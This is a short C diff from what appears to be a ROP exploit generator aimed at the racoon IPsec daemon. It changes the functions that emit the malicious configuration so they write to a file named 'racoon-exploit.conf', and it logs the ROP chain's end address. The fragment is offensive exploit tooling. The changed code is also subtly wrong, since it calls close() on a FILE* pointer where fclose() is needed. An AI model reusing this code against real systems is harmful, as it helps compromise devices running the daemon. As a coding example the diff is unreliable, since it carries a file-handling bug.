@@ -220,18 +220,28 @@ Addr newArray(unsigned int values[], unsigned int count) {
 
 void ropOpen() {
 	lines++;
-	printf("sainfo address ::1 icmp6 address ::1 icmp6 {\n");
+	FILE* fd = fopen("racoon-exploit.conf", "w");
+	if(fd != NULL) {
+		fprintf(fd, "sainfo address ::1 icmp6 address ::1 icmp6 {\n");
+		close(fd);
+	}
 	memset(vars, 0, VARS_MAX_SIZE);
 }
 
 void ropClose() {
+
 	fprintf(stderr, "ROP end address: 0x%08x\n", ropWriteAddr);
 	ropWriteVars();
 
 	if (ropFile != NULL) fclose(ropFile);
 	if (ropVarsFile != NULL) fclose(ropVarsFile);
+
 	lines++;
-	printf("}\n");
+	FILE* fd = fopen("racoon-exploit.conf", "a");
+	if(fd != NULL) {
+		fprintf(fd, "}\n");
+		close(fd);
+	}
 }
 
 
